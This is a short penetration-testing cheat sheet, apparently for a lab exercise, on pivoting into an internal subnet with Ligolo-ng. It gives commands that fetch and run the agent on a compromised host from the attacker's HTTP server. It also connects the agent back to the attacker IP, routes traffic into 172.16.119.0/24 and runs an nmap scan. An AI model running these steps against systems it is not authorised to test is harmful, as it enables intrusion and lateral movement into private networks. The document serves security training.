
## 🚀 Ligolo-ng Pivoting Cheat Sheet

### Phase 1: Preparation (On Parrot OS)

First, ensure you have a statically compiled agent to avoid `GLIBC` errors on older targets.

Bash

```
# 1. Build the static agent
cd ~/ligolo-ng
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o ligolo-agent-static cmd/agent/main.go

# 2. Build the proxy
go build -o ligolo-proxy cmd/proxy/main.go

# 3. Setup the TUN interface (Required for routing)
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
```

---

### Phase 2: Delivery (Transfer to Target)

Transfer the agent from your Parrot machine to the compromised host (DMZ01).

Bash

```
# On Parrot (Host the file)
python3 -m http.server 8080

# On Target (Download and execute)
wget http://10.10.14.111:8080/ligolo-agent-static -O /home/jbetty/ligolo-agent
chmod +x /home/jbetty/ligolo-agent
```

---

### Phase 3: Establishing the Tunnel

**1. Start the Proxy (On Parrot):**

Bash

```
sudo ./ligolo-proxy -selfcert
```

**2. Connect the Agent (On Target):**

Bash

```
/home/jbetty/ligolo-agent -connect 10.10.14.111:11601 -ignore-cert
```

**3. Activate the Session (Inside Ligolo-Proxy Terminal):**

- Type `session`, then select your active agent (e.g., `1`).
    
- Type `start` to begin the relay.
    

---

### Phase 4: Routing & Access

Now you must tell your local OS to send internal traffic into the tunnel.

Bash

```
# On Parrot (New Terminal)
sudo ip route add 172.16.119.0/24 dev ligolo
```

**Verify the Connection:**

Bash

```
# Test the tunnel with a no-ping scan
nmap -Pn -p 22 172.16.119.10
```